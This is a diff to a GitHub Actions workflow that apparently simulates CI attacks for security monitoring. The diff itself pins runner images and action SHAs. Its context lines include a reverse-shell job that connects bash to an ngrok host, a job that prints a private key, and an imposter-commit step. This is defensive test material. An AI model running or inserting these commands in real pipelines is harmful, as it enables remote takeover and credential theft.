@@ -18,9 +18,9 @@ on:
 jobs:
   tj-actions-simulation:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     steps:
-      - uses: step-security/harden-runner@v2
+      - uses: step-security/harden-runner@9af89fc71515a100421586dfdb3dc9c984fbf411 # v2.19.4
         with:
          egress-policy: audit
      
@@ -92,9 +92,9 @@ jobs:
 
   pytorch-simulation:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     steps:
-    - uses: step-security/harden-runner@v2
+    - uses: step-security/harden-runner@9af89fc71515a100421586dfdb3dc9c984fbf411 # v2.19.4
       with:
          egress-policy: audit
     - name: Checkout
@@ -106,9 +106,9 @@ jobs:
           https://api.github.com/repos/step-security-experiments/github-actions-goat/actions/runners/registration-token)
   reverse-shell: 
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     steps:
-      - uses: step-security/harden-runner@v2
+      - uses: step-security/harden-runner@9af89fc71515a100421586dfdb3dc9c984fbf411 # v2.19.4
         with:
           egress-policy: audit
 
@@ -117,9 +117,9 @@ jobs:
           bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1"
   privileged-conatiner:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     steps:
-      - uses: step-security/harden-runner@v2
+      - uses: step-security/harden-runner@9af89fc71515a100421586dfdb3dc9c984fbf411 # v2.19.4
         with:
           egress-policy: audit
 
@@ -129,9 +129,9 @@ jobs:
 
   handle-private-key:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     steps:
-    - uses: step-security/harden-runner@v2
+    - uses: step-security/harden-runner@9af89fc71515a100421586dfdb3dc9c984fbf411 # v2.19.4
       with:
          egress-policy: audit
     - name: Checkout code
@@ -151,20 +151,20 @@ jobs:
         cat private_key.pem
   imposter-commit:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     
     steps:
-    - uses: step-security/harden-runner@v2
+    - uses: step-security/harden-runner@9af89fc71515a100421586dfdb3dc9c984fbf411 # v2.19.4
       with:
          egress-policy: audit
     - name: Checkout code
       uses: actions/checkout@v3
-    - uses: step-security/dummy-imposter-commit-action@v1
+    - uses: step-security/dummy-imposter-commit-action@891dbcd4d1bf6c2ac2a7b9d8d6656583f3b5cc9a # v1
   unauthorized-outbound-call:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     steps:
-    - uses: step-security/harden-runner@v2
+    - uses: step-security/harden-runner@9af89fc71515a100421586dfdb3dc9c984fbf411 # v2.19.4
       with:
          egress-policy: block
          allowed-endpoints: >
@@ -211,9 +211,9 @@ jobs:
     # done
     # wait
     # echo "All 100 baseline runs triggered!"
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     steps:
-    - uses: step-security/harden-runner@v2
+    - uses: step-security/harden-runner@9af89fc71515a100421586dfdb3dc9c984fbf411 # v2.19.4
       with:
          egress-policy: audit
          
